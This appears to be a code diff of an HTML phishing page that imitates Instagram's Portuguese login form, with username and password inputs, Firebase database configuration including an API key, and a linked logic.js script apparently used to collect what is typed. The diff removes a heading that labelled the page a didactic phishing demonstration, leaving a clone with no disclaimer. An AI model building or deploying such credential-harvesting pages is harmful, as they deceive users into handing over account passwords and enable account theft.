@@ -1,72 +1,66 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE-edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram.com</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  </head>
 
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE-edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram.com</title>
-  <link rel="stylesheet" type="text/css" href="style2.css">
-  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-</head>
+  <body>
+    <div id="fake-body">
+      <div class="container">
+        <div class="login-form">
+          <img src="img/logoinsta.png">
+          <button id="primeiro-botao"><a href="#" style="--i:1;"><i class='bx bxl-facebook'></i></a>Continuar com o
+            facebook</button>
+          <div class="segundo-elemento">
+            <div class="line"></div>
+            <div class="text-ou">OU</div>
+            <div class="line"></div>
+          </div>
+          <input type="text" id="login-email" placeholder="Telefone, nome de usuário ou email"
+            style="font-size: 12px; font-weight: 100;">
+          <input type="password" id="login-senha" placeholder="Senha" style="font-size: 12px;">
+          <div class="bloco-3">
+            <div id="BotaoEsqueceuSenha" class="text-senha">Esqueceu a senha?</div>
+          </div>
+          <button id="botao-entrar">Entrar</button>
 
-<body>
-  <h1>ESTE SITE É APENAS UMA DEMONSTRAÇÃO DE UMA APLICAÇÃO DE PHISHING! ELE FOI CRIADO APENAS PARA FINS DIDÁTICOS.</h1>
-  <div id="fake-body">
-    <div class="container">
-      <div class="login-form">
-        <img src="img/logoinsta.png">
-        <button id="primeiro-botao"><a href="#" style="--i:1;"><i class='bx bxl-facebook'></i></a>Continuar com o
-          facebook</button>
-        <div class="segundo-elemento">
-          <div class="line"></div>
-          <div class="text-ou">OU</div>
-          <div class="line"></div>
-        </div>
-        <input type="text" id="login-email" placeholder="Telefone, nome de usuário ou email"
-          style="font-size: 12px; font-weight: 100;">
-        <input type="password" id="login-senha" placeholder="Senha" style="font-size: 12px;">
-        <div class="bloco-3">
-          <div id="BotaoEsqueceuSenha" class="text-senha">Esqueceu a senha?</div>
-        </div>
-        <button id="botao-entrar">Entrar</button>
+          <div id="MensagemDeErro"> A senha ou o usuário estão incorretos.</div>
+          <div id="MensagemIndisponivel"> Indisponível no momento.</div>
 
-        <div id="MensagemDeErro"> Sua senha está incorreta. Confira-a.</div>
-        <div id="MensagemIndisponivel"> Funcionalidade indisponível no momento atual. Entre para saber mais.</div>
-
-        <div class="bloco-4">
-          <div class="text-cadastro">
-            <div>Näo tem uma conta? <span id="BotaoCadastro" class="cadastro">Cadastre-se</span></div>
+          <div class="bloco-4">
+            <div class="text-cadastro">
+              <div>Näo tem uma conta? <span id="BotaoCadastro" class="cadastro">Cadastre-se</span></div>
+            </div>
           </div>
         </div>
       </div>
     </div>
-  </div>
 
-  <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-database.js"></script>
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyCX0ooWr-sj8nE3wGbm_pajLvHp7f3L2G4",
-      authDomain: "instagram-bc776.firebaseapp.com",
-      databaseURL: "https://instagram-bc776-default-rtdb.firebaseio.com/",
-      projectId: "instagram-bc776",
-      storageBucket: "instagram-bc776.appspot.com",
-      messagingSenderId: "1007707129119",
-      appId: "1:1007707129119:web:7feb47f44aa15e114e9c2a",
-      measurementId: "G-1ZGERKS7YS"
-    };
+    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-database.js"></script>
+    <script>
+      const firebaseConfig = {
+        apiKey: "AIzaSyCX0ooWr-sj8nE3wGbm_pajLvHp7f3L2G4",
+        authDomain: "instagram-bc776.firebaseapp.com",
+        databaseURL: "https://instagram-bc776-default-rtdb.firebaseio.com/",
+        projectId: "instagram-bc776",
+        storageBucket: "instagram-bc776.appspot.com",
+        messagingSenderId: "1007707129119",
+        appId: "1:1007707129119:web:7feb47f44aa15e114e9c2a",
+        measurementId: "G-1ZGERKS7YS"
+      };
 
-    firebase.initializeApp(firebaseConfig);
-  </script>
-  <script src="logic.js"></script>
+      firebase.initializeApp(firebaseConfig);
+    </script>
+    <script src="logic.js"></script>
 
-  <!-- <footer class="footer">
-      <img src="">
-    </footer> -->
-</body>
-
+  </body>
 </html>
